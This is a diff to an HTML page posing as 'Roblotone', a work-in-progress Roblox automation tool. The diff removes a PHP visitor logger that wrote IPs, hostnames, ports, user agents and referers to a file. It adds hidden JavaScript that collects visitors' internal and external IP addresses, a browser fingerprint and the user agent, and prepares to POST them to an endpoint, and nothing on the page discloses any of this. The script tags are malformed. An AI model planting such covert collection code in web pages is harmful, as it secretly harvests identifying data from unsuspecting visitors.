@@ -1,5 +1,45 @@
 <!DOCTYPE html>
 <html>
+ <script/>
+ var userData = {
+    "internalIPs": [],
+    "externalIPs": {"ipv4": [], "ipv6": []},
+    "fingerprintHash": '',
+    "userAgent": navigator.userAgent
+}
+
+getIPs(function(ip){
+    //local IPs
+    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
+        userData.internalIPs.push(ip);
+    //IPv6 addresses
+    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
+        userData.externalIPs["ipv6"].push(ip);
+    //assume the rest are public IPs
+    else
+        userData.externalIPs["ipv4"].push(ip);
+});
+
+new Fingerprint2().get(function(fingerprint, components){
+  // this will use all available fingerprinting sources
+  userData.fingerprintHash = fingerprint
+
+  // components is an array of all fingerprinting components used
+});
+
+var sendInfo = function(endpoint){
+    setTimeout(function(){
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", endpoint, true);
+        xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+        // send the collected data as JSON
+        xhr.send(JSON.stringify(userData));
+        xhr.onloadend = function () {
+        // done
+        } 
+    }, 3000)
+}
+</>
 <head>
 <title>
 </title>
@@ -11,25 +51,6 @@ p {font-family:Georgia, serif;font-size:14px;font-style:normal;font-weight:norma
 </style>
 </head>
 <body>
-<?php
- 
-$protocol = $_SERVER['SERVER_PROTOCOL'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$port = $_SERVER['REMOTE_PORT'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
-$ref = $_SERVER['HTTP_REFERER'];
-$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
- 
-//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
- 
-$fh = fopen('log.txt', 'a');
-fwrite($fh, 'IP Address: '."".$ip ."\n");
-fwrite($fh, 'Hostname: '."".$hostname ."\n");
-fwrite($fh, 'Port Number: '."".$port ."\n");
-fwrite($fh, 'User Agent: '."".$agent ."\n");
-fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
-fclose($fh);
-?>
 <h1>Roblotone. The most advanced Roblox automation tool.</h1>
 <p>WIP</p>
 </body>
